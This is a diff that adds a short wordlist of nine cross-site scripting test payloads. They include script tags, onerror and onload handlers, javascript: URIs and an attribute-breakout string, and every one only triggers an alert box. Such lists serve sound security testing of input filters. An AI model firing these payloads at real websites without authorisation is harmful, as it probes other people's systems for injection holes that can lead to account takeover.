@@ -1,0 +1,9 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+javascript:alert('XSS')
+"><script>alert('XSS')</script>
+';alert(String.fromCharCode(88,83,83))//
+<iframe src="javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
